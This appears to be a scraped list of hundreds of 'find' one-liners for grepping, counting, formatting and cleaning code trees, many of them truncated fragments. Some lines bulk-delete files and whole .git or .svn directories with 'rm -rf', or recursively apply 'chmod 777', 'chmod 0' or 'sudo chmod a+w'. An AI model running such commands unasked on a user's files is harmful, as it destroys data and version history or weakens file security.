find ./ -type f -exec echo {} \; -exec enca -L none {} \; | grep -B 1
find ./ -type d | pdo cd
find ./ -type d -name '.kitchen' | xargs rm -rv {}
find ./ -name php_errors.log -print0 | xargs -0 rm -rf
find ./ -name \._\* | xargs rm -rf
find ./ -name \.DS_Store | xargs rm -rf
find ./ -name \*.php | xargs -n 1 php -l
find ./ -name .svn -prune -o -name \*.php -print0 | xargs -0l1 php -l
find ./ -name .prgHistory | xargs cat
find ./ -name .DS_Store -print0 | xargs -0 rm
find ./ -name *.m | xargs grep -n --color
find ./ -name *.h | xargs grep -n --color
find ./ -name *.cpp | xargs grep -n --color
find ./ -name 'test*.py' | grep
find ./ -name 'qa.txt' -exec grep ^[0-9] {} + | cut -d ':' -f2
find ./ -name '.svn' | xargs rm -Rf
find ./ -name '.*.swp'|xargs rm -v
find ./ -name '*swp' | xargs rm -f
find ./ -name '*pyc' | xargs rm -f
find ./ -name '*.yml' | xargs grep --color=auto -n
find ./ -name '*.xml' | xargs grep --color=auto -n
find ./ -name '*.txt' | xargs grep --color=auto -n
find ./ -name '*.twig' | xargs grep --color=auto -n
find ./ -name '*.ts' -print0 | xargs -0 grep
find ./ -name '*.swp' | xargs rm
find ./ -name '*.sh' | xargs grep --color=auto -n
find ./ -name '*.rb' | xargs grep -n --color=always
find ./ -name '*.rb' | xargs grep --color=auto -n
find ./ -name '*.py' |xargs grep -n
find ./ -name '*.py' | xargs grep -n --color=always
find ./ -name '*.py' | xargs grep --color=auto -n
find ./ -name '*.py' | xargs black -l 120
find ./ -name '*.py' -print0 | xargs -0 grep
find ./ -name '*.py' -or -name '*.html' -or -name '*.js' -or -name '*.css' | xargs grep
find ./ -name '*.php' | xargs grep --color=auto -n
find ./ -name '*.php' -print0 | xargs -0 grep
find ./ -name '*.js' | xargs grep -n --color=always
find ./ -name '*.js' | xargs grep --color=auto -n
find ./ -name '*.html' | xargs grep -n --color=always 2>/dev/null
find ./ -name '*.html' -print0 | xargs -0 grep
find ./ -name '*.css' | xargs grep --color=auto -n
find ./ -name '*.cpp' | xargs grep -n --color=always
find ./ -name '*.coffee' | xargs grep -n --color=always
find ./ -name '*.c' -or -name '*.h' -or -name '*.cpp' -or -name '*.S' | cscope -Rbk
find ./ -name '*' | xargs grep --color=auto -n
find ./ -maxdepth 5 -type f | xargs grep
find ./ -maxdepth 5 -type f | xargs egrep
find ./ -maxdepth 1 -iname package.json -exec pygmentize -l sh {} \; | less -S
find ./ -iname '*.rb' | xargs ctags
find ./ -follow -maxdepth 1 -type f | wc -l
find ./ *.java | xargs wc -l
find ./ *.cc *.h | xargs wc -l
find ./ *.c *.h | xargs wc -l
find ./ *.c *.cpp *.h | xargs wc -l
find ./ '*.java' | xargs wc -l
find . .. -maxdepth 0 -ls | grep -v [.]$
find . |xargs grep -n
find . |xargs grep --color -n
find . |less
find . |grepc
find . |grep -i
find . |grep --color=auto
find . |grep
find . | xargs wc -l
find . | xargs grep 2>/dev/null
find . | xargs grep -sn
find . | xargs grep -sl
find . | xargs grep -si
find . | xargs grep -s
find . | xargs grep -rn
find . | xargs grep -ni $1
find . | xargs grep -n --color=auto
find . | xargs grep -n --color=always
find . | xargs grep -n --color
find . | xargs grep -l
find . | xargs grep -is --color todo
find . | xargs grep -inr --color
find . | xargs grep -i -n -s
find . | xargs grep -i $1
find . | xargs grep -i
find . | xargs grep -I --no-messages --colour --line-number
find . | xargs grep -I
find . | xargs grep --color=always -s
find . | xargs grep $1
find . | xargs grep
find . | xargs -n 512 grep
find . | wc -l
find . | wc
find . | selecta
find . | sed 's/[^/]*\\//│ /g;s/│ *\\([^│ ]\\)/├── \\1/'
find . | rg
find . | peco-cd
find . | peco
find . | pcregrep
find . | more
find . | le
find . | igrep
find . | grep 2>/dev/null
find . | grep .swp$
find . | grep -v svn
find . | grep -v -E '(.git)'
find . | grep -v
find . | grep -i --color=always
find . | grep -i $@
find . | grep -i
find . | grep -e
find . | grep -P --color $*
find . | grep -E \
find . | grep --ignore-case --color=always
find . | grep --color=auto -i
find . | grep --color=auto -E
find . | grep --color=auto
find . | grep --color=always -i
find . | grep --color=always
find . | grep '\.sql$'
find . | grep $1
find . | grep
find . | g $*
find . | fzy
find . | fzf --preview 'bat --color=always {}'
find . | fzf
find . | fgrep
find . | ep
find . | entr -c
find . | egrep -v \
find . | egrep -i --color
find . | egrep -i
find . | egrep --color=always
find . | egrep
find . | cpio -o -H newc > ../newramdisk.cpio
find . | awk '{ FS=\
find . | ag --smart-case
find . | ag
find . | ack
find . | /bin/grep
find . \( \( -name .svn -o -name .git \) -prune \) -o -type f -print0 | xargs -0 glark $*
find . \( -name makefile -o -name '*.mak' \) -print | xargs egrep $1
find . \( -name \*\.xml \) -a -type f -print0 | xargs -0 grep -n
find . \( -name \*\.py \) -a -type f -print0 | xargs -0 grep -n
find . \( -name \*\.idl \) -a -type f -print0 | xargs -0 grep -n
find . \( -name \*\.h -o -name \*\.hpp \) -a -type f -print0 | xargs -0 grep -n
find . \( -name \*\.h -o -name \*\.hpp -o -name \*\.cc -o -name \*\.cpp -o -name \*\.c \) -a -type f -print0 | xargs -0 grep -n
find . \( -name \*.php -o -name \*.inc -o -name \*.default \) | xargs grep -n
find . \( -name \*.css -o -name \*.js -o -name \*.html \) -print0 | xargs -0 grep -n
find . \( -name \*.cgi -o -name \*.pl -o -name \*.pm \) | xargs grep -n
find . \( -name .svn -o -name .git \) -prune -o -type f -print0 2> /dev/null | xargs -0 egrep
find . \( -name .git -o -name node_modules \) -prune -o -type f -print | xargs sed -i
find . \( -name .git -o -name node_modules \) -prune -o -type f -print | xargs
find . \( -name .git -o -name .svn \) -prune -o \( -type f -name \*.cpp -or -name \*.lua -or -name \*.cc -or -name \*.s -or -name \*.c -or -name \*.h -or -name \*.hpp -or -name \*.py -or -name \*.js \) -print0 | xargs -0 egrep -i -n
find . \( -name .git -o -name .svn \) -prune -o \( -type f -name \*.cpp -or -name \*.lua -or -name \*.cc -or -name \*.c -or -name \*.h -or -name \*.cfg -or -name \*.py \) -print0 | xargs -0 egrep -i -n
find . \( -name 'vendor' -o -name '.git' -o -name 'log' -o -name '.tags' \) -prune -o -type f -print0 | xargs -0 grep -n
find . \( -name '*.rb' -or -name '*.erb' -or -name '*.yml' \) -print0 | rename --stdin -0
find . \( -name '*.pyc' -o -name '__pycache__' \) -print0 | xargs -0 rm -rf
find . \( -name '*.p[ml]' -o -name '*.t' -o -name '*.html' \) | xargs grep --color=always
find . \( -name '*.h' -o -name '*.cpp' -o -name '*.c' -o -name '*.cc' -o -name '*.y' -o -name '*.l' \) | xargs glark -M $*
find . \( -name '*.h' -o -name '*.cpp' -o -name '*.c' -o -name '*.cc' -o -name '*.y' -o -name '*.l' \) | xargs glark $*
find . \( -iname \*\.pyc -o -iname \*\.pyo \) -print0 | xargs -0 rm -f
find . \( -iname \*.h -o -iname \*.c -o -iname \*.cpp \) | xargs clang-format -style=file -i
find . \( ! -regex '.*/\..*' \) -type f -or -type l | sed -e s/^.// -e /^$/d
find . \! -type d | wc -l
find . \! -name '.*' -name '*.clj' | xargs etags --regex='/[ \t\(]*def[a-z]* \([a-z-!]+\)/\1/' --regex='/[ \\t\(]*ns \([a-z.]+\)/\1/'
find . 2>/dev/null | xargs egrep --color -I 2>/dev/null
find . 2>/dev/null | grep -i $1
find . 2>/dev/null | grep -i
find . 2>/dev/null | grep --color -I
find . 2>/dev/null | grep
find . 2>/dev/null | ggrep -E
find . 2>/dev/null | ag
find . 2> /dev/null | grep
find . -xdev | crep -i
find . -user $LOGNAME -perm +0200 -type f | sort
find . -type l | xargs ls -l --color=auto
find . -type l | sed 's/.\//\//' >> .gitignore
find . -type l | rg
find . -type l -exec ls -l {} \; | grep
find . -type l ! -exec test -e {} \; -print | xargs rm
find . -type f|xargs grep -in
find . -type f|xargs grep
find . -type f| xargs grep -n --color
find . -type file | xargs egrep -nw $1
find . -type file | xargs egrep $1
find . -type file ! -path './.git/*' | peco
find . -type f |xargs grep --color --line-number
find . -type f |xargs grep
find . -type f | xargs wc -l
find . -type f | xargs touch
find . -type f | xargs tail -f
find . -type f | xargs sed -i 's/[ \\t]*$//'
find . -type f | xargs grep 2>/dev/null -e
find . -type f | xargs grep 2>/dev/null --color -i
find . -type f | xargs grep 2>/dev/null --color
find . -type f | xargs grep 2> /dev/null
find . -type f | xargs grep -nH
find . -type f | xargs grep -nE --color
find . -type f | xargs grep -n
find . -type f | xargs grep -l
find . -type f | xargs grep -insI
find . -type f | xargs grep -i --color -n
find . -type f | xargs grep -i
find . -type f | xargs grep -e $1
find . -type f | xargs grep -H
find . -type f | xargs grep -E
find . -type f | xargs grep --color=auto -ri
find . -type f | xargs grep --color=always
find . -type f | xargs grep --color -n
find . -type f | xargs grep --color
find . -type f | xargs grep $@
find . -type f | xargs grep
find . -type f | xargs fgrep -s
find . -type f | xargs fgrep 'TODO'
find . -type f | xargs egrep --color=always
find . -type f | xargs dos2unix
find . -type f | xargs chmod 644
find . -type f | xargs -n 10 nkf -w --overwrite
find . -type f | xargs -i bash -c
find . -type f | xargs -I {} epdfview {}
find . -type f | xargs -I {} bash -c \
find . -type f | xargs
find . -type f | wc -l' # number of files (not directories)
find . -type f | wc -l' # Number of files (not directories)
find . -type f | wc -l'
find . -type f | wc -l
find . -type f | vi -
find . -type f | sources
find . -type f | sort
find . -type f | sed -n 's/.*\/\(.*\)/\1/p'
find . -type f | sed -e 's/^/\
find . -type f | rg
find . -type f | perl -ne
find . -type f | parallel --no-notice -j+1 grep --color=always -n -H -A 2 -B 2 -I -e
find . -type f | p4 -x - have > /dev/null
find . -type f | mplayer -ao sdl -fs -playlist - -shuffle -loop 0
find . -type f | mplayer -ao sdl -fs -playlist - -loop 0
find . -type f | grp
find . -type f | grep -v git
find . -type f | grep -v '.git/'
find . -type f | grep --color=always
find . -type f | grep --color
find . -type f | grep $1
find . -type f | grep
find . -type f | git check-ignore --stdin
find . -type f | fzy
find . -type f | fzf --preview 'head -100 {}'
find . -type f | fzf
find . -type f | egrep -i
find . -type f | egrep --color=always
find . -type f | egrep
find . -type f | awk -F. '!a[\$NF]++{print \$NF}'
find . -type f | awk 'BEGIN {FS=\
find . -type f | ag
find . -type f \( -name \*.git -o -name .snaphot -o -name .bak -prune \) -print0 | xargs -0 grep -in
find . -type f \! -path *.svn* -print0 | xargs -0 grep \$1
find . -type f \! -path *.svn* -print0 | xargs -0 grep -l $1
find . -type f \! -name '*.o' -print0 | xargs -0 grep -l '<<<<<<'
find . -type f 2>/dev/null|grep
find . -type f 2>/dev/null | grep
find . -type f 2> /dev/null | xargs grep -n --color
find . -type f 2> /dev/null | xargs grep -li 2>/dev/null
find . -type f -size 0 | perl -nle unlink
find . -type f -size 0 -print0 | xargs -0 /bin/rm -f
find . -type f -size 0 -mtime +90 | xargs rm
find . -type f -size -100000c -print0 | xargs -0 grep --color=always -r -i -n
find . -type f -size +50000k -exec ls -lh {} \; | awk '{ print \$9 \
find . -type f -size +50000k -exec ls -lh {} \; | awk '{ print $9 \
find . -type f -size +50000k -exec ls -lh {} \; | awk '{ print $9
find . -type f -size +50000k -exec ls -lh {} \; 2>/dev/null | awk
find . -type f -size +100000k -exec ls -lh {} \; | awk '{ print $9
find . -type f -printf '%s\t%p\n' | sort -g
find . -type f -printf '%k %p\n' | sort -nr
find . -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort
find . -type f -print0|xargs -0 id3tag
find . -type f -print0|xargs -0 grep -s
find . -type f -print0|xargs -0 grep -n --colour=always
find . -type f -print0|xargs -0 grep -in --colour=always
find . -type f -print0|xargs -0 grep -C 2 -i
find . -type f -print0| xargs -0 cvs add
find . -type f -print0 | xargs grep -nH -e
find . -type f -print0 | xargs -0 stat -f \
find . -type f -print0 | xargs -0 stat -f
find . -type f -print0 | xargs -0 stat --format
find . -type f -print0 | xargs -0 sed -i -e
find . -type f -print0 | xargs -0 sed -i 's=#!/bin=#!/run/current-system/sw/bin=g'
find . -type f -print0 | xargs -0 sed -i
find . -type f -print0 | xargs -0 rm
find . -type f -print0 | xargs -0 p4 fstat >/dev/null
find . -type f -print0 | xargs -0 ls --color=auto -lhtr
find . -type f -print0 | xargs -0 grep -w
find . -type f -print0 | xargs -0 grep -sl
find . -type f -print0 | xargs -0 grep -nE
find . -type f -print0 | xargs -0 grep -n --colour=auto
find . -type f -print0 | xargs -0 grep -n
find . -type f -print0 | xargs -0 grep -l
find . -type f -print0 | xargs -0 grep -i
find . -type f -print0 | xargs -0 grep -Ini --color=auto
find . -type f -print0 | xargs -0 grep -I -H -n --color=always
find . -type f -print0 | xargs -0 grep -I -H -i -n --color=always
find . -type f -print0 | xargs -0 grep -H -n
find . -type f -print0 | xargs -0 grep -E
find . -type f -print0 | xargs -0 grep --color=auto -i -n
find . -type f -print0 | xargs -0 grep --color=auto
find . -type f -print0 | xargs -0 grep --color=always -n -i
find . -type f -print0 | xargs -0 grep --color=always
find . -type f -print0 | xargs -0 grep --color -F
find . -type f -print0 | xargs -0 grep $1
find . -type f -print0 | xargs -0 grep
find . -type f -print0 | xargs -0 egrep -niH --color
find . -type f -print0 | xargs -0 egrep -i
find . -type f -print0 | xargs -0 dos2unix
find . -type f -print0 | xargs -0 chown danyadsmith:admin
find . -type f -print0 | xargs -0 chmod 664
find . -type f -print0 | xargs -0 chmod 644
find . -type f -print0 | xargs -0 chmod 600
find . -type f -print0 | xargs -0 chmod 0644 && \
find . -type f -print0 | xargs -0 chmod 0644
find . -type f -print0 | xargs -0 chmod 0
find . -type f -print0 | xargs -0 chmod -x
find . -type f -print0 | xargs -0 chmod +x
find . -type f -print0 | xargs -0 chmod
find . -type f -print0 | xargs -0 chflags uchg
find . -type f -print0 | xargs -0 chflags nouchg
find . -type f -print0 | xargs -0 ag
find . -type f -print0 | xargs -0 -n 100 stat -f
find . -type f -print0 | xargs -0 -n 1 -P 4 dos2unix
find . -type f -print0 | xargs -0 -P 32 grep
find . -type f -print0 | xargs -0 -I{} sudo chmod a+w {}
find . -type f -print0 | xargs -0
find . -type f -print0 | xargs --null grep
find . -type f -print0 | tr -d -c
find . -type f -print0 2> /dev/null | xargs -0 grep -i
find . -type f -print | xargs grep -n --color=auto
find . -type f -print | xargs grep -n
find . -type f -print | xargs grep -i
find . -type f -print | xargs grep --color=auto -n
find . -type f -print | xargs grep '$1'
find . -type f -print | xargs grep
find . -type f -print | xargs chmod 664
find . -type f -print | xargs chmod
find . -type f -print | wc -l
find . -type f -print | p4 -x - add
find . -type f -print | grep $1
find . -type f -print | grep
find . -type f -path ./app/\* -a ! -path \*/.svn/\* -o -type f -path ./config/\* -a ! -path \*/.svn/\* -o -type f -path ./db/\* -a ! -path \*/.svn/\* -o -type f -path ./lib/\* -a ! -path \*/.svn/\* -o -type f -path ./test/\* -a ! -path \*/.svn/\* | egrep -v
find . -type f -not -path \*/.svn/\* -not -path \*~ | xargs grep -I -H -n --color=always --context=1
find . -type f -not -path '*/\.*' -exec md5sum {} \; | uniq -D -w32
find . -type f -not -path '*/.git/*' -print0 | xargs -0
find . -type f -not -path '*/.git/*' -a -not -path '*/.svn/*' -print0 | xargs -0 grep --color=auto
find . -type f -not -path '*/.git/*' -a -not -path '*/.svn/*' -name '*.pm' -print0 | xargs -0 grep --color=auto
find . -type f -not -path '*/.git/*' -a -not -path '*/.svn/*' -a \( -name '*.py' \) -print0 | xargs -0 grep --color=auto
find . -type f -not -path '*/.git/*' -a -not -path '*/.svn/*' -a \( -name '*.pl' -or -name '*.pm' -or -name '*.cgi' \) -print0 | xargs -0 grep --color=auto
find . -type f -not -name \*svn\* -print0 | xargs -0 grep --color $1 -I
find . -type f -name \*scala|xargs grep -ni
find . -type f -name \*php|xargs grep -ni
find . -type f -name \*php -print0 -or -type f -name \*phtml -print0 | xargs -0 grep --color=auto
find . -type f -name \*php -print0 -or -type f -name \*phtml -print0 | xargs -0 egrep --color=auto
find . -type f -name \*less|xargs grep -ni
find . -type f -name \*js|xargs grep -ni
find . -type f -name \*js | xargs grep --color=auto
find . -type f -name \*html|xargs grep -ni
find . -type f -name \*css|xargs grep -ni
find . -type f -name \*css | xargs grep --color=auto
find . -type f -name \*css -print0 | xargs -0 egrep --color=auto
find . -type f -name \*cf? | xargs grep --color=auto
find . -type f -name \*cf? -print0 | xargs -0 egrep --color=auto
find . -type f -name \*.swp | xargs rm
find . -type f -name \*.pyc -print | xargs rm
find . -type f -name \*.hh | xargs grep
find . -type f -name \*.cpp -or -name \*.lua -or -name \*.cc -or -name \*.c -or -name \*.h -or -name \*.cfg -or -name \*.py -print0 | xargs -0 egrep -i -n
find . -type f -name \*.cc | xargs grep
find . -type f -name \*.\*hs -print0 | xargs -0 hasktags -e
find . -type f -name \*.\*hs -print0 | xargs -0 hasktags -c
find . -type f -name \* | xargs grep -I
find . -type f -name Android.mk | xargs grep --color -n LOCAL_MODULE[^_] -i
find . -type f -name Android.mk | xargs grep --color -n -i
find . -type f -name .DS_Store -print0 | xargs -0 rm
find . -type f -name *~ | xargs rm
find . -type f -name 'CMakeLists.txt' | xargs cmake-format -i
find . -type f -name '*.txt' | xargs fgrep -s
find . -type f -name '*.tpl' -print0 | xargs -0 grep -n
find . -type f -name '*.sh' -print0 | xargs -0 grep -n
find . -type f -name '*.rst' | xargs fgrep -s
find . -type f -name '*.rs' -exec grep -v '^\s*$' '{}' \; | wc -l
find . -type f -name '*.rej' | xargs rm -f
find . -type f -name '*.rb' | xargs grep
find . -type f -name '*.pyc' | xargs rm -f
find . -type f -name '*.py'|xargs grep
find . -type f -name '*.py' | xargs fgrep -s
find . -type f -name '*.py' | xargs etags
find . -type f -name '*.php' -print0 | xargs -0 grep -n
find . -type f -name '*.php' -or -name '*.ctp' -exec php -l {} \; | grep -v '^No'
find . -type f -name '*.php' -exec php -l {} \; | grep -v '^No syntax'
find . -type f -name '*.php' -exec php -l {} \; | (! grep -v \
find . -type f -name '*.orig'| xargs rm -f
find . -type f -name '*.mli' | xargs grep
find . -type f -name '*.ml' | xargs grep -i
find . -type f -name '*.ml' | xargs grep --mmap
find . -type f -name '*.js' -print0 | xargs -0 grep -n
find . -type f -name '*.html' | xargs fgrep -s
find . -type f -name '*.hs' -print0 | xargs -0 hasktags -c
find . -type f -name '*.go' | xargs ctags -e
find . -type f -name '*.go' -print0 | xargs -0 -r -n1 gofmt -w
find . -type f -name '*.env' -print0 2>/dev/null | xargs -0 blackbox_register_new_file
find . -type f -name '*.css' -print0 | xargs -0 grep -n
find . -type f -name '*.DS_Store|*:2eDS_Store' -ls -delete
find . -type f -name '*'|xargs grep
find . -type f -name '*' -not -path './.git/*' -not -path './venv/*' -not -path './fonts/*' -not -path './*/fonts/*' -not -path './images/*' -not -path './*/images/*' -not -path './__pycache__/*' -not -path './*/__pycache__/*' -not -path './*.pyc' -not -path './*.wsgi' -not -path './*.json' -not -path './*.sql' | xargs wc -l
find . -type f -name '*' -not -path './.git/*' -not -path './fonts/*' -not -path './*/fonts/*' -not -path './images/*' -not -path './*/images/*' -not -path './_file-manager/*' | xargs wc -l
find . -type f -name '$1' | xargs wc -l
find . -type f -name '#?*#' -o -name '*?~' | xargs -n1 rm
find . -type f -maxdepth 1 | xargs ls -Alh
find . -type f -ls | grep -i
find . -type f -iregex '.*\.\(java\)' -print0 | xargs -0 grep --color -n
find . -type f -iname '*.php' -o -iname '*.inc' -o -iname '*.module' | xargs etags
find . -type f -iname '*.js' -exec cat {} \; | wc
find . -type f -iname '*.h'|xargs grep
find . -type f -iname '*.c*' |xargs grep
find . -type f -follow | xargs grep
find . -type f -follow -print0 | xargs -0 grep
find . -type f -exec wc -l {} \; | summ
find . -type f -exec wc -l {} + | sort -rn
find . -type f -exec wc -l {} + | sort -n
find . -type f -exec stat --format '%y : %s : %n' {} \; | sort -nr
find . -type f -exec ls -s {} \; | sort -n -r
find . -type f -exec ls -l {} \; | awk
find . -type f -exec file {} + | grep -v
find . -type f -exec file -bi {} \; -print|less
find . -type f -exec du -h {} + | sort -r -h
find . -type f -exec du -h {} + | sort -hr
find . -type f -exec cat {} + | wc -w
find . -type f -exec cat {} + | wc -l
find . -type f -and -not -name '*.pyc' -and -not -name '__init__.py' | xargs gvim
find . -type f ! -perm 644 -print0 | xargs -0 chmod 644
find . -type d |grep -i
find . -type d | xargs grep
find . -type d | xargs du -hs
find . -type d | xargs chmod 755
find . -type d | while read d; do convert \
find . -type d | wc -l
find . -type d | sources
find . -type d | sort
find . -type d | sed -e 1d -e
find . -type d | rg
find . -type d | ls -lARG
find . -type d | grp
find . -type d | grep -vF .git
find . -type d | grep -v -e \
find . -type d | grep --color=always
find . -type d | grep $1
find . -type d | grep
find . -type d | egrep -i
find . -type d | egrep --color=always
find . -type d | egrep
find . -type d | ag
find . -type d \( -name log -o -name tmp \) -prune -o -print | xargs grep -sn
find . -type d \( -name log -o -name tmp \) -prune -o -print | xargs grep -sl
find . -type d 2>/dev/null|grep
find . -type d -print0 | xargs -0 chown danyadsmith:admin
find . -type d -print0 | xargs -0 chmod 777
find . -type d -print0 | xargs -0 chmod 775
find . -type d -print0 | xargs -0 chmod 755
find . -type d -print0 | xargs -0 chmod 744
find . -type d -print0 | xargs -0 chmod 700
find . -type d -print0 | xargs -0 chmod 0755"
find . -type d -print0 | xargs -0 chflags uchg
find . -type d -print0 | xargs -0 chflags nouchg
find . -type d -print | xargs chmod 775
find . -type d -print | xargs chmod
find . -type d -name'*.svn'|xargs rm -rf
find . -type d -name out | xargs rm -rf
find . -type d -name build | xargs rm -rf
find . -type d -name bin -o -name obj | xargs rm -r > /dev/null
find . -type d -name .svn | xargs rm -rf
find . -type d -name .svn -prune -o -type f -print | xargs lgrep -n
find . -type d -name .svn -prune -o -type f -print | xargs lgrep
find . -type d -name .git -prune -o -type f -print | xargs lgrep
find . -type d -name .git -print0| xargs -0 -I@ sh -c 'echo @;git --git-dir=@ fetch -a'
find . -type d -name 'node_modules' -print | xargs -n1 rm -rf
find . -type d -name 'build' | xargs rm -rf
find . -type d -name '\.svn' |xargs rm -rf
find . -type d -name '\.git' |xargs rm -rf
find . -type d -name 'DerivedData' | xargs rm -rf
find . -type d -name '.terragrunt-cache' -or -name '.terraform' | xargs rm -rf
find . -type d -name '*.xcworkspace' -maxdepth 1 -print | xargs open
find . -type d -name '*.xcodeproj' -maxdepth 1 -print | xargs open
find . -type d -maxdepth 1 | sort
find . -type d -maxdepth 1 -exec du -sh {} + | sort -n
find . -type d -iname '.svn' | xargs -0 rm -rf
find . -type d -empty | sort
find . -type d -empty -print0 |xargs -0 -I % touch %/.
find . -type d -depth 1 | xargs -I{} touch {}/.index
find . -type d ! -perm 755 -print0 | xargs -0 chmod 755
find . -type -print0 | xargs -0 chmod
find . -type -f | xargs grep
find . -tAypef | wc -l; du -sh err.txt generated.file succ.txt
find . -size 0 | xargs rm
find . -size 0 -print0 | xargs -0 rm
find . -size +250M -exec ls --size -h {} \+ | sort -rh
find . -size +200M | cat >> .gitignore
find . -size +1G -print0|xargs -0 -I file ls -lh file
find . -size +100M | cat >> .gitignore;git add --all
find . -size +100M ! -path *git* | cut -c 3- > .gitignore; git add .
find . -regextype posix-egrep -regex '.*\.[h](pp)?' -type f -print0 | xargs -0 grep -n
find . -regextype posix-egrep -regex '.*\.[ch](pp)?' -type f -print0 | xargs -0 grep -n
find . -regextype posix-egrep -regex '.*\.[c](pp)?' -type f -print0 | xargs -0 grep -n
find . -regex .*~ | xargs rm -f
find . -regex '\./src/.*\.rs' -or -name Cargo.toml | xargs nvim term://zsh
find . -regex '.*\(.AppleDouble\|.DS_Store\)$' -ls -exec rm -r {} \;
find . -regex '.*/*\.p[l|m]' -type f -exec /usr/share/vim/vim73/tools/pltags.pl {} + > /dev/null
find . -regex '.*.swp$' | xargs rm
find . -readable -maxdepth 1 -exec du -sh {} \; 2>/dev/null| sort -h
find . -print0 | xargs -0 touch
find . -print0 | xargs -0 grep --directories=skip -l
find . -print0 | xargs -0 grep
find . -print0 | xargs -0 egrep -n --color=always 2>/dev/null
find . -print0 | xargs -0 egrep -i
find . -print0 | xargs -0 egrep -I
find . -print0 | xargs -0 -- grep
find . -print0 | xargs -0
find . -print0 -type f | xargs -0 -- grep
find . -print | wc -l
find . -print | sed -e \
find . -print | sed -e
find . -print | grep -v
find . -print | grep -i
find . -print | grep --color -n -i
find . -print | grep
find . -print | egrep -i
find . -print 2>/dev/null | grep -F
find . -perm -1 -type f -maxdepth 1 2>/dev/null | xargs rm
find . -path \*static\*bundle\*.js -print0 | xargs -0 rm
find . -path .svn -prune -o -print | grep
find . -path ./.git -prune -o -print | grep
find . -path ./.git -prune -o -path ./log -prune -o -type f -print0 | xargs -0 grep -n -E $1
find . -path './out' -prune -o -type f \( -name '*.h' \) -print0 | xargs -0 grep --color -n
find . -path './out' -prune -o -type f \( -iname 'kconfig' -o -iname 'Makefile' \) -print0 | xargs -0 grep --color -n
find . -path './out' -prune -o -type f \( -iname '*.xml' -o -iname 'Makefile' \) -print0 | xargs -0 grep --color -n
find . -path './out' -prune -o -type f \( -iname '*.py' \) -print0 | xargs -0 grep --color -n
find . -path './out' -prune -o -type f \( -iname '*.mk' -o -iname 'Makefile' \) -print0 | xargs -0 grep --color -n
find . -path './.git' -prune -o -type f -print0 | xargs -0 sed -i ''
find . -path '*/build/*' -prune -path '*.git*' -prune -o -print | grep -i
find . -path '*/.svn' -prune -o -type f -print | grep -I -n -e
find . -path '*/.svn' -prune -o -type f -print 2>/dev/null | xargs grep -n 2>/dev/null
find . -path '*.svn*' -prune -o -type f -print0 | xargs -0 grep -i -E
find . -path '*.svn*' -prune -o -type f -print | grep -i
find . -path '*.svn*' -prune -o -print | grep
find . -not \( -type d -name .git -prune \) -not \( -type d -name node_modes -prune \) -and \( -type f \)|sort -f
find . -not \( -name .svn -prune \) -type f -print0 | xargs --null grep $1
find . -not \( -name .svn -prune -o -name .git -prune \) -type f -print0 | xargs -0 sed -i '' -E \
find . -not \( -name .svn -prune -o -name .git -prune \) -type f -print0 | xargs -0 sed -i
find . -not \( -name .git -prune \) -type f -print0 | xargs -0 sed -i '' -E \
find . -not -regex '.*/\..*' -print0 | xargs -0 grep -E
find . -not -path './venv/*' -not -path './vendor/*' -not -path './src/vendor/*' -not -path './.git/*' -name '*.*' | xargs wc -l
find . -not -path './venv/*' -not -path './vendor/*' -not -path './.git/*' -name '*.yaml' | xargs wc -l
find . -not -path './venv/*' -not -path './vendor/*' -not -path './.git/*' -name '*.py' | xargs wc -l
find . -not -path './venv/*' -not -path './vendor/*' -not -path './.git/*' -name '*.js' | xargs wc -l
find . -not -path './venv/*' -not -path './vendor/*' -not -path './.git/*' -name '*.go' | xargs wc -l
find . -not -path './vendor/*' -and -name '*.go' | xargs gofmt -w
find . -not -path './node_modules/*' -not -name '*.swp' | entr sh -c
find . -not -path '*.git*'|grep -i
find . -not -name '*min*' -name '*.js' -print0 | xargs -0 grep -n
find . -name target -prune -or -name .git -prune -or -name .idea -prune -or -name node_modules -prune -or -name bower_components -prune -or -type f -print0 | xargs -0 grep -i
find . -name tags -o -name cscope.* | xargs /bin/rm
find . -name pom.xml|xargs grep
find . -name pom.xml | xargs grep
find . -name node_modules -type d | xargs rm -rf
find . -name jmimemagic.log | xargs rm
find . -name cscope -prune -o -name .svn -prune -o -name .pc -prune -o -name CVS -prune -o -name doc -prune -o -name Doc -prune -o -print | xargs grep --color=auto
find . -name core -o -name \*.core -o \! -name . \( -type d -prune \! -type d \) | xargs rm
find . -name config | xargs sed -i -e 's/filemode = true/filemode = false/'
find . -name __pycache__ | xargs rm -rf
find . -name __pycache__ -o -name *.pyc | xargs -I {} rm -rf {}
find . -name \*~ | xargs rm
find . -name \*~ -prune -o -name \.git -prune -o -name cache -prune -o -type f -print0 | xargs -0r grep -HnI --color=always
find . -name \*gz | parallel zcat {}
find . -name \*.swp -type f -print0 | xargs -0 rm -f
find . -name \*.suo -o -name \*.user -o -name \*obj -o -name \*bin | xargs -d \\n rm -fr
find . -name \*.rb | xargs flog
find . -name \*.rb -print | etags --filter=yes > TAGS
find . -name \*.py|xargs grep --color -n
find . -name \*.pyi -print0 | xargs -0 rm
find . -name \*.pyc | xargs rm
find . -name \*.pyc | xargs
find . -name \*.pyc -print0 | xargs -0 rm
find . -name \*.pyc -o -name \*.pyo -o -name __pycache__ | xargs -i rm -rf {}
find . -name \*.py | xargs grep -in --colour
find . -name \*.py | xargs grep -i
find . -name \*.py | xargs etags
find . -name \*.py | xargs /code/env/black/bin/black -l 79 -S
find . -name \*.py | xargs
find . -name \*.py -print | xargs ~/workdir/code/software_src_code/ptags.py; vim
find . -name \*.py -print | xargs pytags.py
find . -name \*.py -or -name git-\* | xargs etags > TAGS
find . -name \*.py -not -path \*migrations/\* -not -path \*vendor/\* -not -path \*settings/\* | xargs pyflakes
find . -name \*.pdb -or -name input_tmp.in -or -name \*.job.\* -or -name trajs -or -name pdbs -or -name stats.txt|xargs rm -r;ls
find . -name \*.patch \| cut -c3-
find . -name \*.orig | xargs rm
find . -name \*.orig -o -name \*.rej | xargs rm
find . -name \*.org | xargs rm
find . -name \*.m | xargs grep -n --color=auto
find . -name \*.js | grep -v
find . -name \*.jade | xargs grep -s
find . -name \*.h | xargs grep -ins
find . -name \*.h | xargs grep $1
find . -name \*.h -type f| xargs grep -n --color
find . -name \*.h -print -o -name \*.cpp -print -o -name \*.c -print | xargs grep -i
find . -name \*.go | xargs grep -in --colour
find . -name \*.go -type f| xargs grep -n --color
find . -name \*.cpp -print | cut -d
find . -name \*.c | xargs grep -ins
find . -name \*.c | xargs grep $1
find . -name \*.c -o -name \*.h | xargs grep -ins
